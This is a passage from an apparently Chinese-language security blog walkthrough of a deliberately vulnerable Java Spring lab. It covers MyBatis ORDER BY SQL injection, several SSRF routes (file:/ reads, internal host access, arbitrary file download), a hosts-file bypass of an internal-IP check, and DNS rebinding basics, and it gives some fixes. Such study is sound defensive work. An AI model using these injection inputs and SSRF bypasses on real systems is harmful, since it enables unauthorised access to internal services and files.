class=&#34;token class-name&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;findByUserNameVuln03&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@Param&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;order&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; order&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// UserMapper.xml&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;select id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;findByUserNameVuln03&#34;&lt;/span&gt; parameterType&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;String&#34;&lt;/span&gt; resultMap&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;User&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        select &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; from users&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; test&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;order != null&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            order by $&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;order&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; asc&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;select&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;mybatis&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;orderby&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;vuln03&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;sort&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;id desc&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;修复方案：&lt;/p&gt;
&lt;p&gt;正确使用 &lt;code&gt;orm&lt;/code&gt;  框架，预编译传入的参数。&lt;/p&gt;
&lt;h5 id=&#34;防护方案&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防护方案&#34;&gt;#&lt;/a&gt; 防护方案：&lt;/h5&gt;
&lt;p&gt;（1）预编译&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;String sql = &amp;quot;select * from users where username = ?&amp;quot;;
PreparedStatement st = con.prepareStatement(sql);
复制代码12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（2）waf&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; private static final Pattern FILTER_PATTERN = Pattern.compile(&amp;quot;^[a-zA-Z0-9_/\\.-]+$&amp;quot;);
 public static String sqlFilter(String sql) &amp;#123;
        if (!FILTER_PATTERN.matcher(sql).matches()) &amp;#123;
            return null;
        &amp;#125;
        return sql;

java复制代码123456
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（3）MyBatis 防护&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@Select(&amp;quot;select * from users where username = #&amp;#123;username&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; ssrf&lt;/h2&gt;
&lt;h3 id=&#34;1路由ssrfurlconnectionvuln&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1路由ssrfurlconnectionvuln&#34;&gt;#&lt;/a&gt; 1. 路由 /ssrf/urlConnection/vuln&lt;/h3&gt;
&lt;p&gt;漏洞代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    @RequestMapping(value = &amp;quot;/urlConnection/vuln&amp;quot;, method = &amp;#123;RequestMethod.POST, RequestMethod.GET&amp;#125;)
    public String URLConnectionVuln(String url) &amp;#123;
        return HttpUtils.URLConnection(url);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再来看函数 &lt;code&gt;UrlConnection&lt;/code&gt;  的定义：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   public static String URLConnection(String url) &amp;#123;
        try &amp;#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &amp;#123;
                html.append(inputLine);
            &amp;#125;
            in.close();
            return html.toString();
        &amp;#125; catch (Exception e) &amp;#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &amp;#125;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我们可以用文件读取协议 &lt;code&gt;file:/&lt;/code&gt;  实现访问，也可以访问到内网的其他主机&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930115111649.png&#34; alt=&#34;image-20240930115111649&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;2路由ssrfhttpurlconnectionvuln&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2路由ssrfhttpurlconnectionvuln&#34;&gt;#&lt;/a&gt; 2. 路由 /ssrf/HttpURLConnection/vuln&lt;/h3&gt;
&lt;p&gt;漏洞代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@GetMapping(&amp;quot;/HttpURLConnection/vuln&amp;quot;)
public String httpURLConnectionVuln(@RequestParam String url) &amp;#123;
    return HttpUtils.HttpURLConnection(url);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;来看函数 &lt;code&gt;HttpUrlConnection&lt;/code&gt;  定义：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    public static String HttpURLConnection(String url) &amp;#123;
        try &amp;#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &amp;#123;
                html.append(inputLine);
            &amp;#125;
            in.close();
            return html.toString();
        &amp;#125; catch (IOException e) &amp;#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &amp;#125;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里用 &lt;code&gt;HttpURLConnection&lt;/code&gt;  类进行了一个强转，限制只能使用 http/https 协议，但可以访问内网其他主机：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930143648191.png&#34; alt=&#34;image-20240930143648191&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;3路由ssrfopenstream&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3路由ssrfopenstream&#34;&gt;#&lt;/a&gt; 3. 路由 /ssrf/openStream&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;    @GetMapping(&amp;quot;/openStream&amp;quot;)
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException &amp;#123;
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try &amp;#123;
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + &amp;quot;.&amp;quot; + WebUtils.getFileExtension(url);
            // download
            response.setHeader(&amp;quot;content-disposition&amp;quot;, &amp;quot;attachment;fileName=&amp;quot; + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) &amp;gt; 0) &amp;#123;
                outputStream.write(bytes, 0, length);
            &amp;#125;

        &amp;#125; catch (Exception e) &amp;#123;
            logger.error(e.toString());
        &amp;#125; finally &amp;#123;
            if (inputStream != null) &amp;#123;
                inputStream.close();
            &amp;#125;
            if (outputStream != null) &amp;#123;
                outputStream.close();
            &amp;#125;
        &amp;#125;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以通过这个路由实现任意文件下载：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930145400529.png&#34; alt=&#34;image-20240930145400529&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;4路由ssrfhttpsyncclientsvuln&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4路由ssrfhttpsyncclientsvuln&#34;&gt;#&lt;/a&gt; 4. 路由 /ssrf/HttpSyncClients/vuln&lt;/h3&gt;
&lt;p&gt;漏洞代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    @GetMapping(&amp;quot;/HttpSyncClients/vuln&amp;quot;)
    public String HttpSyncClients(@RequestParam(&amp;quot;url&amp;quot;) String url) &amp;#123;
        return HttpUtils.HttpAsyncClients(url);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;HttpAsyncClients&lt;/code&gt;  函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; public static String HttpAsyncClients(String url) &amp;#123;
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try &amp;#123;
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future&amp;lt;HttpResponse&amp;gt; future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        &amp;#125; catch (Exception e) &amp;#123;
            return e.getMessage();
        &amp;#125; finally &amp;#123;
            try &amp;#123;
                httpclient.close();
            &amp;#125; catch (Exception e) &amp;#123;
                logger.error(e.getMessage());
            &amp;#125;
        &amp;#125;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;未对 SSRF 进行检查，存在漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930160113322.png&#34; alt=&#34;image-20240930160113322&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;5路由ssrfresttemplatevuln1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5路由ssrfresttemplatevuln1&#34;&gt;#&lt;/a&gt; 5. 路由 /ssrf/restTemplate/vuln1&lt;/h3&gt;
&lt;p&gt;漏洞代码：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@GetMapping&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/restTemplate/vuln1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RestTemplateUrlBanRedirects&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; url&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;HttpHeaders&lt;/span&gt; headers &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;HttpHeaders&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        headers&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setContentType&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;MediaType&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;APPLICATION_JSON_UTF8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;httpService&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;RequestHttpBanRedirects&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这段代码使用 &lt;strong&gt;Spring RestTemplate&lt;/strong&gt; 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930161505278.png&#34; alt=&#34;image-20240930161505278&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;6路由ssrfresttemplatevuln2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6路由ssrfresttemplatevuln2&#34;&gt;#&lt;/a&gt; 6. 路由 /ssrf/restTemplate/vuln2&lt;/h3&gt;
&lt;p&gt;漏洞代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   @GetMapping(&amp;quot;/restTemplate/vuln2&amp;quot;)
    public String RestTemplateUrl(String url)&amp;#123;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个不禁止重定向了，直接就可以 SSRF&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162139227.png&#34; alt=&#34;image-20240930162139227&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;7路由ssrfhutoolvuln&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7路由ssrfhutoolvuln&#34;&gt;#&lt;/a&gt; 7. 路由 /ssrf/hutool/vuln&lt;/h3&gt;
&lt;p&gt;漏洞代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@GetMapping(&amp;quot;/hutool/vuln&amp;quot;)
public String hutoolHttp(String url)&amp;#123;
    return HttpUtil.get(url);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;换汤不换药，该库也能 SSRF, 不过禁止了重定向：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162620184.png&#34; alt=&#34;image-20240930162620184&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;8路由ssrfdnsrebindvuln&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8路由ssrfdnsrebindvuln&#34;&gt;#&lt;/a&gt; 8. 路由 /ssrf/dnsrebind/vuln&lt;/h3&gt;
&lt;p&gt;漏洞代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@GetMapping(&amp;quot;/dnsrebind/vuln&amp;quot;)
public String DnsRebind(String url) &amp;#123;
    java.security.Security.setProperty(&amp;quot;networkaddress.cache.negative.ttl&amp;quot; , &amp;quot;0&amp;quot;);
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) &amp;#123;
        return &amp;quot;Dangerous url&amp;quot;;
    &amp;#125;
    return HttpUtil.get(url);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;checkSSRFWithoutRedirect&lt;/code&gt;  函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) &amp;#123;
        if(url == null) &amp;#123;
            return false;
        &amp;#125;
        return !SSRFChecker.isInternalIpByUrl(url);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;isInternalIpByUrl&lt;/code&gt;  函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public static boolean isInternalIpByUrl(String url) &amp;#123;

        String host = url2host(url);
        if (host.equals(&amp;quot;&amp;quot;)) &amp;#123;
            return true; // 异常URL当成内网IP等非法URL处理
        &amp;#125;

        String ip = host2ip(host);
        if (ip.equals(&amp;quot;&amp;quot;)) &amp;#123;
            return true; // 如果域名转换为IP异常，则认为是非法URL
        &amp;#125;

        return isInternalIp(ip);
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;添加了 IP 检查，修改一下 dns 解析即可绕过，方法如下：&lt;/p&gt;
&lt;p&gt;给本地的 hosts 文件添加一条解析记录：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;192.168.1.43 www.baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后就可以实现 ssrf：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930165613203.png&#34; alt=&#34;image-20240930165613203&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns重绑定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns重绑定&#34;&gt;#&lt;/a&gt; DNS 重绑定&lt;/h3&gt;
&lt;h4 id=&#34;dns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns&#34;&gt;#&lt;/a&gt; dns:&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;DNS (Domain Name Service)、计算机域名服务器，是&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJBJTkyJUU4JTgxJTk0JUU3JUJEJTkx&#34;&gt;互联网&lt;/span&gt;的一项服务。它作为将&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTlGJTlGJUU1JTkwJThE&#34;&gt;域名&lt;/span&gt;和&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSVAlRTUlOUMlQjAlRTUlOUQlODA=&#34;&gt; IP 地址&lt;/span&gt;相互&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk4JUEwJUU1JUIwJTg0&#34;&gt;映射&lt;/span&gt;的一个&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTg4JTg2JUU1JUI4JTgzJUU1JUJDJThGJUU2JTk1JUIwJUU2JThEJUFFJUU1JUJBJTkz&#34;&gt;分布式数据库&lt;/span&gt;，能够使人更方便地访问&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJBJTkyJUU4JTgxJTk0JUU3JUJEJTkx&#34;&gt;互联网&lt;/span&gt;。DNS 使用&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJDJUEwJUU4JUJFJTkzJUU2JThFJUE3JUU1JTg4JUI2JUU1JThEJThGJUU4JUFFJUFF&#34;&gt; TCP&lt;/span&gt; 和&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JTk0JUE4JUU2JTg4JUI3JUU2JTk1JUIwJUU2JThEJUFFJUU2JThBJUE1JUU1JThEJThGJUU4JUFFJUFF&#34;&gt; UDP&lt;/span&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVENQL1VEUCVFNyVBQiVBRiVFNSU4RiVBMyVFNSU4OCU5NyVFOCVBMSVBOA==&#34;&gt; 端口&lt;/span&gt; 53 [&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTlGJTlGJUU1JTkwJThEJUU3JUIzJUJCJUU3JUJCJTlGI2NpdGVfbm90ZS0x&#34;&gt;1]&lt;/span&gt;。当前，对于每一级域名长度的限制是 63 个字符，域名总长度则不能超过 253 个字符。开始时，域名的字符仅限于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvQVNDSUk=&#34;&gt; ASCII&lt;/span&gt; 字符的一个子集。2008 年，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSUNBTk4=&#34;&gt;ICANN&lt;/span&gt; 通过一项决议，允许使用其它语言作为互联网顶级域名的字符。使用基于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvUHVueWNvZGU=&#34;&gt; Punycode&lt;/span&gt; 码的&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSUROQQ==&#34;&gt; IDNA&lt;/span&gt; 系统，可以将&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVW5pY29kZQ==&#34;&gt; Unicode&lt;/span&gt; 字符串映射为有效的 DNS 字符集。因此，诸如 “XXX. 中国”、“XXX. 美国” 的域名可以在地址栏直接输入并访问，而不需要安装插件。但是，由于英语的广泛使用，使用其他语言字符作为域名会产生多种问题，例如难以输入，难以在国际推广等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;小概念简单地说，DNS 的存在就是为了域名解析，DNS 绑定的效果就是在 DNS 中将域名请求解析为相应的服务器 IP 地址请求，好处就是人们访问服务器的时候，不需要背枯燥的 32 位 IPv4 的地址，而是可以大众化的单词，相当有含义和方便。&lt;/p&gt;
&lt;p&gt;域名解析就是可以通过这个域名直接找到他的 IP&lt;strong&gt; 地址&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;dns的记录类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns的记录类型&#34;&gt;#&lt;/a&gt; DNS 的记录类型&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;- 主机记录(A记录):A记录是用于名称解析的重要记录，它将特定的主机名映射到对应的主机IP上
- 别名记录(CNAME记录):CNAME记录用于将某个别名指向到某个A记录上,这就就不需要再为某个新名字创建一条新纪录。
- 名称服务器记录(NS):委托DNS区域使用已提供的权威域名服务器,用来指定该域名由那个DNS服务器来解析,后面谈一下DNSLog的开发思路会涉及这个。
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;dns绑定技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns绑定技术&#34;&gt;#&lt;/a&gt; DNS 绑定技术：&lt;/h4&gt;
&lt;p&gt;1.DNS 区域是一个层次结构的空间，根域名服务器 -》子域名服务器 -》二代子域名服务器&lt;/p&gt;
&lt;p&gt;2.DNS 查询方式：递归和迭代&lt;/p&gt;
&lt;p&gt;递归一般是指&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;以查询 zh.wikipedia.org 为例：

客户端发送查询报文&amp;quot;query zh.wikipedia.org&amp;quot;至DNS服务器，DNS服务器首先检查自身缓存，如果存在记录则直接返回结果。
如果记录老化或不存在，则：
DNS服务器向根域名服务器发送查询报文&amp;quot;query zh.wikipedia.org&amp;quot;，根域名服务器返回顶级域 .org 的权威域名服务器地址。
DNS服务器向 .org 域的权威域名服务器发送查询报文&amp;quot;query zh.wikipedia.org&amp;quot;，得到二级域 .wikipedia.org 的权威域名服务器地址。
DNS服务器向 .wikipedia.org 域的权威域名服务器发送查询报文&amp;quot;query zh.wikipedia.org&amp;quot;，得到主机 zh 的A记录，存入自身缓存并返回给客户端。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我们 需要注意的是，DNS 的返回结果是可以由 DNS 服务器自己来决定的&lt;/p&gt;
&lt;p&gt;所以说我可以编写一个 DNS 服务器来控制指定域名的解析 IP，而且可以控制 TTL 值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;请求域名解析（第一种路径）&lt;/p&gt;
&lt;p&gt;（1），浏览器发起的请求&lt;/p&gt;
